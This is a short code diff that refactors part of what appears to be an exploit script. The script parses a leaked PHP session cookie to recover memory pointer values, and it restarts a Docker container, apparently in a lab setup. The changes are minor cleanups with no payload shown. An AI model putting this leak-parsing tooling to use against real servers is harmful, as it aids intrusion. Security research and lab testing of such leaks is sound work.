@@ -31,6 +31,7 @@ from __future__ import annotations
 
 import argparse
 import os
+import shlex
 import shutil
 import socket
 import struct
@@ -113,10 +114,11 @@ def send_plain(host: str, port: int, path: str, body: bytes, timeout: float = 12
 
 
 def parse_leak(resp: bytes, profile=None):
-    i = resp.find(b"Set-Cookie: PHPSESSID=")
+    _COOKIE_PREFIX = b"Set-Cookie: PHPSESSID="
+    i = resp.find(_COOKIE_PREFIX)
     if i < 0:
         raise RuntimeError("no Set-Cookie in leak response (%d bytes)" % len(resp))
-    val = resp[i + len("Set-Cookie: PHPSESSID="):].split(b"\r\n")[0]
+    val = resp[i + len(_COOKIE_PREFIX):].split(b"\r\n")[0]
     dec = urllib.parse.unquote_to_bytes(val.decode("latin1"))
     counts = Counter()
     ptr_max = profile["ptr_max"] if profile is not None else 0xFFFFFFFFFFFF
@@ -223,7 +225,7 @@ def main() -> int:
             pass
 
     if args.restart:
-        subprocess.run(args.docker.split() + ["restart", args.restart],
+        subprocess.run(shlex.split(args.docker) + ["restart", args.restart],
                        check=True, stdout=subprocess.DEVNULL)
         time.sleep(1.2)
 
